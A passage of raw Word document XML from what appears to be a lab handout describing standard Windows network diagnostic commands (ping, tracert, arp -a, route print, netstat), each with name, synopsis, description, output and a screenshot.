        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00406FE6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="00406FE6">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ping - checks network connectivity with another host.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37C47719" w14:textId="77777777" w:rsidR="00B8536F" w:rsidRPr="00406FE6" w:rsidRDefault="00B8536F" w:rsidP="00B8536F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00406FE6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="00406FE6">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ping &lt;hostname/IP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0719D439" w14:textId="77777777" w:rsidR="00B8536F" w:rsidRPr="00406FE6" w:rsidRDefault="00B8536F" w:rsidP="00B8536F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00406FE6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="00406FE6">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Sends packets to the specified host to check connectivity and measure the response time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04EF55E5" w14:textId="77777777" w:rsidR="00B8536F" w:rsidRPr="00406FE6" w:rsidRDefault="00B8536F" w:rsidP="00B8536F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00406FE6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="00406FE6">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays replies from the destination, packet statistics, and response times.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CBED4BB" w14:textId="258B3258" w:rsidR="00B8536F" w:rsidRDefault="00406FE6" w:rsidP="00B8536F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="68172FE9" wp14:editId="5C95E498">
            <wp:extent cx="5534660" cy="3933825"/>
            <wp:effectExtent l="0" t="0" r="8890" b="9525"/>
            <wp:docPr id="859878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8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5534660" cy="3933825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CCB032C" w14:textId="77777777" w:rsidR="00037340" w:rsidRDefault="00037340" w:rsidP="00406FE6">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E1919BD" w14:textId="41AE0A39" w:rsidR="00406FE6" w:rsidRPr="00406FE6" w:rsidRDefault="00406FE6" w:rsidP="00406FE6">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00406FE6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>4. tracert</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23FD67B7" w14:textId="77777777" w:rsidR="00406FE6" w:rsidRPr="00406FE6" w:rsidRDefault="00406FE6" w:rsidP="00406FE6">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00406FE6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="00406FE6">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> tracert - displays the route taken by packets to the destination.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B809B4A" w14:textId="77777777" w:rsidR="00406FE6" w:rsidRPr="00406FE6" w:rsidRDefault="00406FE6" w:rsidP="00406FE6">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00406FE6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="00406FE6">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> tracert &lt;hostname/IP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FD24E7C" w14:textId="77777777" w:rsidR="00406FE6" w:rsidRPr="00406FE6" w:rsidRDefault="00406FE6" w:rsidP="00406FE6">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00406FE6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="00406FE6">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Traces the path taken by packets from the local computer to the specified destination by identifying intermediate routers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6219B466" w14:textId="77777777" w:rsidR="00406FE6" w:rsidRDefault="00406FE6" w:rsidP="00406FE6">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00406FE6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="00406FE6">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the intermediate network devices and response times along the route.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F43A09" w14:textId="77777777" w:rsidR="00037340" w:rsidRDefault="00037340" w:rsidP="00406FE6">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77F230C6" w14:textId="77777777" w:rsidR="00037340" w:rsidRDefault="00037340" w:rsidP="00406FE6">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1ACBC96D" w14:textId="77777777" w:rsidR="00037340" w:rsidRDefault="00037340" w:rsidP="00406FE6">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C097607" w14:textId="77777777" w:rsidR="00037340" w:rsidRPr="00406FE6" w:rsidRDefault="00037340" w:rsidP="00766CB5">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66131AAF" w14:textId="57A7419F" w:rsidR="00406FE6" w:rsidRDefault="00037340" w:rsidP="00B8536F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="468D4F9F" wp14:editId="36345EF4">
            <wp:extent cx="5163185" cy="1581150"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2256145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9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5163185" cy="1581150"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A28CB79" w14:textId="77777777" w:rsidR="006B4928" w:rsidRPr="00A43BE1" w:rsidRDefault="006B4928" w:rsidP="006B4928">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A43BE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>5. arp -a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A12AB36" w14:textId="77777777" w:rsidR="006B4928" w:rsidRPr="00A43BE1" w:rsidRDefault="006B4928" w:rsidP="006B4928">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A43BE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="00A43BE1">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> arp -a - displays the ARP cache table.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6197990B" w14:textId="4D3057B4" w:rsidR="00A43BE1" w:rsidRPr="00A43BE1" w:rsidRDefault="006B4928" w:rsidP="00A43BE1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A43BE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="00A43BE1">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> arp -a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="736FC9C9" w14:textId="77777777" w:rsidR="006B4928" w:rsidRPr="00A43BE1" w:rsidRDefault="006B4928" w:rsidP="006B4928">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A43BE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="00A43BE1">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the Address Resolution Protocol (ARP) cache, which contains mappings between IP addresses and physical (MAC) addresses.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="229D1769" w14:textId="77777777" w:rsidR="006B4928" w:rsidRDefault="006B4928" w:rsidP="006B4928">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A43BE1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="00A43BE1">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the available IP address and corresponding MAC address entries.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17CF0AEF" w14:textId="07BCD405" w:rsidR="00A43BE1" w:rsidRDefault="0065332A" w:rsidP="006B4928">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="721E7C16" wp14:editId="38A62E9D">
            <wp:extent cx="5425440" cy="6592757"/>
            <wp:effectExtent l="0" t="0" r="3810" b="0"/>
            <wp:docPr id="11686775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0"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5425440" cy="6592757"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="17DD6AB7" w14:textId="77777777" w:rsidR="0065332A" w:rsidRDefault="0065332A" w:rsidP="006B4928">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36F1EBC1" w14:textId="77777777" w:rsidR="0065332A" w:rsidRDefault="0065332A" w:rsidP="006B4928">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="404313DB" w14:textId="77777777" w:rsidR="0065332A" w:rsidRDefault="0065332A" w:rsidP="006B4928">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DCF4C77" w14:textId="77777777" w:rsidR="00F87D07" w:rsidRPr="00F87D07" w:rsidRDefault="00F87D07" w:rsidP="00F87D07">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F87D07">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>6. route print</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B55C14" w14:textId="77777777" w:rsidR="00F87D07" w:rsidRPr="00F87D07" w:rsidRDefault="00F87D07" w:rsidP="00F87D07">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F87D07">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="00F87D07">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> route print - displays the routing table.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C9A4600" w14:textId="77777777" w:rsidR="00F87D07" w:rsidRPr="00F87D07" w:rsidRDefault="00F87D07" w:rsidP="00F87D07">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F87D07">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="00F87D07">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> route print</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="457C6CEE" w14:textId="77777777" w:rsidR="00F87D07" w:rsidRPr="00F87D07" w:rsidRDefault="00F87D07" w:rsidP="00F87D07">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F87D07">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="00F87D07">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the IPv4 and IPv6 routing tables used by the system to determine where network packets should be sent.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="516BB4E9" w14:textId="77777777" w:rsidR="00F87D07" w:rsidRPr="00F87D07" w:rsidRDefault="00F87D07" w:rsidP="00F87D07">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F87D07">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="00F87D07">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays the routing table, including destination networks, gateways, and network interfaces.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="687B6816" w14:textId="313E0227" w:rsidR="0065332A" w:rsidRDefault="005903BF" w:rsidP="006B4928">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="32E564F7" wp14:editId="255F268F">
            <wp:extent cx="5731510" cy="5908040"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="153232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1"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="5908040"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB116D6" w14:textId="77777777" w:rsidR="005903BF" w:rsidRPr="00A43BE1" w:rsidRDefault="005903BF" w:rsidP="006B4928">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E2A63BA" w14:textId="77777777" w:rsidR="005903BF" w:rsidRPr="005903BF" w:rsidRDefault="005903BF" w:rsidP="005903BF">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005903BF">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>7. netstat</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B40D19A" w14:textId="77777777" w:rsidR="005903BF" w:rsidRPr="005903BF" w:rsidRDefault="005903BF" w:rsidP="005903BF">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005903BF">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>NAME:</w:t>
      </w:r>
      <w:r w:rsidRPr="005903BF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> netstat - displays active network connections and listening ports.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B5E4AD" w14:textId="77777777" w:rsidR="005903BF" w:rsidRPr="005903BF" w:rsidRDefault="005903BF" w:rsidP="005903BF">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005903BF">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>SYNOPSIS:</w:t>
      </w:r>
      <w:r w:rsidRPr="005903BF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> netstat [OPTION]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D1291B2" w14:textId="77777777" w:rsidR="005903BF" w:rsidRPr="005903BF" w:rsidRDefault="005903BF" w:rsidP="005903BF">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005903BF">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DESCRIPTION:</w:t>
      </w:r>
      <w:r w:rsidRPr="005903BF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays network connections, listening ports, protocol statistics, and related networking information.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6C3321" w14:textId="77777777" w:rsidR="005903BF" w:rsidRDefault="005903BF" w:rsidP="005903BF">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005903BF">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
      <w:r w:rsidRPr="005903BF">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Displays active network connections and listening ports.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="714CE709" w14:textId="77777777" w:rsidR="005659F2" w:rsidRDefault="005659F2" w:rsidP="005903BF">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22DCC5B6" w14:textId="77777777" w:rsidR="005659F2" w:rsidRDefault="005659F2" w:rsidP="005903BF">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FEDD4D0" w14:textId="167CF50A" w:rsidR="005659F2" w:rsidRDefault="00266E8F" w:rsidP="005903BF">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="198"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="52D1456B" wp14:editId="4160E9F8">
            <wp:extent cx="5731510" cy="2415540"/>
